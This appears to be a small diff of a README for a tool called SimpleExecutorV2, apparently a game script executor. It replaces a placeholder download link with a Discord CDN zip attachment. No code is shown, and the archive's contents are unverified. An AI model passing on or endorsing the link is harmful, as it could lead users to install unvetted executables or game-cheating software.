@@ -2,7 +2,7 @@
 
 <img src="images/Png.png" alt="MainLogo" width="156" height="156">
 
-[Download Here (64-bit)](https://normal-api.ml/raw?text=Service%20Unavailable,%20Please%20try%20again%20later.)
+[Download Here (64-bit)](https://cdn.discordapp.com/attachments/929790736906461244/934496230363517008/SimpleExecutorV2Version1.2.6.zip)
 
 Screenshot Of Executor:
 <img src="images/SCREENSHOT59.png" alt="ScreenShot" width="800" height="450">
